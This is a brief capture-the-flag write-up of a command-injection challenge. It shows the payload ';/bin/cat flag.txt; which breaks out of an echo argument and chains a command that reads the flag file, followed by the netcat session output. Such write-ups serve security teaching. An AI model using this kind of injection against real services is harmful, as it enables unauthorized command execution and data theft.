### Solved by superkojiman

We can inject commands to run ont he server. Basically the program will concatenate /bin/echo + the flag. If we inject ```";/bin/cat flag.txt;```, we close the quotes which completes the arguments to /bin/echo. This allows us to chain our next command to read flag.txt:

```
superkojiman@shell-web:~$ nc localhost 16023
";/bin/cat flag.txt;
               _
              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             //
19bc7cb34950108982ea0b9e276c822d
sh: 3: /: Permission denied
sh: 4: //: Permission denied
sh: 5: //: Permission denied
sh: 6: //: Permission denied
sh: 7: //: Permission denied
sh: 8: //: Permission denied
sh: 9: //___________________________________/: not found
sh: 10: //: Permission denied
sh: 11: //: Permission denied
sh: 12: //: Permission denied
sh: 13: //: Permission denied
sh: 14: //: Permission denied
sh: 15: //: Permission denied
sh: 17: Syntax error: Unterminated quoted string
```
